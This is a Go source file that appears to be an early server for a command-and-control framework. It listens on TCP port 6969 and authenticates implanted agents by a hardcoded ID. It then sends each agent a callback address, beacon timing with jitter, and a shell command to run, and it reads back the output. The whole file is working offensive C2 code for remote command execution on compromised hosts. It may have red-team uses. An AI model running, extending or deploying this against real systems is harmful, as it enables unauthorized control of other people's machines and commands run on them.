package main

import (
	"bufio"
	"encoding/gob"
	"fmt"
	"log"
	"net"
	"strings"

	"github.com/PatronC2/Patron/types"
	"github.com/s-christian/gollehs/lib/logger"
)

// TODO add logging
// client connect, callback

func handleconn(connection net.Conn) {
	for {
		text, _ := bufio.NewReader(connection).ReadString('\n')
		message := strings.Split(text, "\n")
		// fmt.Println(message[0])
		if message[0] != "" {
			// fmt.Println(message[0])
			if message[0] == "12344" {
				fmt.Fprintf(connection, "Yes\n")
				logger.Logf(logger.Info, "Agent %s Connected\n", message[0])
				encoder := gob.NewEncoder(connection)
				instruct := types.GiveAgentCommand{
					UpdateAgentConfig: types.ConfigAgent{
						Uuid:              "12344",
						CallbackTo:        "192.20.20.12",
						CallbackFrequency: 5,
						CallbackJitter:    4.5,
					},
					CommandType: "shell",
					Command:     "id",
					Binary:      nil,
				}

				encoder.Encode(instruct)
				destruct := &types.GiveServerResult{}
				dec := gob.NewDecoder(connection)
				dec.Decode(destruct)
				if destruct.Output != "" {
					logger.Logf(logger.Debug, "Agent %s Connected\n", message[0])
				}
			} else {
				logger.Logf(logger.Info, "Agent Unath\n")
			}

		}
	}

}

func main() {
	listener, err := net.Listen("tcp", ":6969")
	if err != nil {
		log.Fatalln(err)
	}

	defer listener.Close()

	for {
		connection, err := listener.Accept()
		if err != nil {
			log.
				Fatalln(err)
		}
		go handleconn(connection)

	}
}
